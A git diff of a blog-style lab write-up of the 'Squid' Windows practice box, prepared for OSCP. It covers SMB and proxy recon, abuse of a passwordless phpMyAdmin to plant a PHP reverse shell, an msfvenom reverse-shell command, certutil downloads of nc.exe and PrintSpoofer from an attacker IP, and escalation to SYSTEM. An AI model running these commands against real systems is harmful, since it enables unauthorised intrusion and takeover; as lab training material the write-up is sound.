@@ -1,7 +1,7 @@
 ---
 layout: /src/layouts/PostLayout.astro
-title: Lavita
-tags: []
+title: Squid
+tags: ["Windows", "SQLi"]
 ---
 **Start 10:10 06-11-2024**
 
@@ -11,8 +11,7 @@ Scope:
 ```
 ---
 ## Recon
-
-==nmap==
+### Nmap
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -49,7 +48,7 @@ Host script results:
 |_    Message signing enabled but not required
 ```
 
-==SMB==
+### SMB
 Right away I notice that `445 - SMB` seems to be open which is on the top of my priorities for Windows machines. I go ahead and investigate it using various tools.
 
 ```bash
@@ -104,7 +103,7 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 Since I was not able to get an anonymous session I tried one of the other ports first to gain more information on possible creds.
 
 
-## 3128/TCP - HTTP
+### 3128/TCP - HTTP
 
 I went to the website and found the following page:
 
@@ -177,7 +176,7 @@ This looks promising but we'd need a way to upload it first. So I settled on cha
 settings via `FoxyProxy` to the target IP so I could go ahead and access port `8080`.
 
 
-## 8080/TCP - HTTP (Proxy)
+### 8080/TCP - HTTP (Proxy)
 
 I changed the proxy settings like so:
 
@@ -201,11 +200,11 @@ I also found more users with the **User accounts** tab:
 
 ![](../../../assets/e648686b69f5876ac391c9c27feb8af7.png)
 
->[!danger]
->Squid, acting as a *reverse proxy*, allows unauthenticated access to an internal Wamp server and PhpMyAdmin interface. The PhpMyAdmin interface is configured with *passwordless* login for the root user, allowing an attacker to create files in the web root, which can lead to code execution.
+:::danger
+Squid, acting as a *reverse proxy*, allows unauthenticated access to an internal Wamp server and PhpMyAdmin interface. The PhpMyAdmin interface is configured with *passwordless* login for the root user, allowing an attacker to create files in the web root, which can lead to code execution.
+:::
 
-
-==SQL Injecting Payload==
+### SQL Injecting Payload
 From here we can thus go ahead and try to upload a reverse shell via the interface. I found a SQL query matching our description:
 
 ![](../../../assets/3c46a590e0ff415c832a4d3c3e0288ec.png)
@@ -242,8 +241,9 @@ Unfortunately enough I ran into an error when going to the `/php-reverse-shell.p
 
 ![](../../../assets/8452c059108dfd546acc76eab91e7c9e.png)
 
->[!bug]
->I did see a response in my own terminal, meaning I did receive a connection. I just need to upload a different shell for this to work properly.
+:::bug
+I did see a response in my own terminal, meaning I did receive a connection. I just need to upload a different shell for this to work properly.
+:::
 
 ```bash
 msfvenom -p php/reverse_php LHOST=192.168.45.234 LPORT=1234 -f raw -o shell.php
@@ -257,7 +257,7 @@ Now I went ahead and uploaded this shell again to the `/uploader.php` endpoint:
 
 This time I in fact did see a response!
 
-==Stabilize Shell==
+## Stabilize Shell
 Unfortunately enough the shell gets dropped after some time, meaning we need to find a way to stabilize it so it stays up. I had to look externally to find some knowledge on how to do this.
 
 I took the following steps:
@@ -312,10 +312,11 @@ This one was found in the directory that I landed in.
 
 ![](../../../assets/d5eb47c6dee738ccac822d84ddd8cce7.png)
 
-# Post Exploitation Enum
+## Post Exploitation Enum
 
->[!important]
->I first wanted to skip this step and go ahead and look for the `proof.txt` flag but instead went and enumerated all the necessary stuff.
+:::important
+I first wanted to skip this step and go ahead and look for the `proof.txt` flag but instead went and enumerated all the necessary stuff.
+:::
 
 ## OS Info
 
@@ -432,7 +433,7 @@ No unusual localgroups at first glance.
 Unfortunately enough the enumeration yielded no specific caveats for me.
 
 
-# Priv Esc
+## Priv Esc
 
 The only interesting thing I had found is the account I'm logged in as:
 
@@ -457,10 +458,11 @@ The writer made a PoC according to this vulnerability:
 ![](../../../assets/4a62f4010e6ca181b76e0ec72e8d4241.png)
 
 
->[!Bug]
->For whatever reason I ran into some trouble using this method so instead I opted for another SQL query where I could issue commands from the URL bar.
+:::bug
+For whatever reason I ran into some trouble using this method so instead I opted for another SQL query where I could issue commands from the URL bar.
+:::
 
-==SQL Injection Payload Alt==
+### SQL Injection Payload Alt
 I entered the following query:
 
 ```SQL
@@ -482,8 +484,9 @@ shell1.php?cmd=certutil -urlcache -f http://192.168.45.230:8001/nc.exe nc.exe
 
 This basically gave me the exact same shell as `nt authority\local service`. I now still had to do the same basically as before. 
 
->[!note]
->Target_IP and host_IP can vary because of multiple restarts from different computers.
+:::note
+Target_IP and host_IP can vary because of multiple restarts from different computers.
+:::
 
 I created a nested reverse shell in case one of them died (ctrl + c):
 
@@ -552,16 +555,14 @@ certutil -urlcache -f http://192.168.45.230:80/PrintSpoofer64.exe PrintSpoofer64
 
 Now I FINALLY had **SYSTEM** privileges and rooted the target.
 
-==proof.txt==
+### proof.txt
 
 ![](../../../assets/22da1efea470594f0e1cae2effa94814.png)
 
->[!summary]
->Quite difficult for an "easy" level box and I had to look for external help quite often but in the end I did manage to do a lot of stuff myself.
-
+:::summary
+Quite difficult for an "easy" level box and I had to look for external help quite often but in the end I did manage to do a lot of stuff myself.
+:::
 ---
-**Finished 21:18 06-11**
+**Finished 21:18 06-11-2024**
 
 [^Links]: [[OSCP Prep]]
-
-#Windows #SQLi 
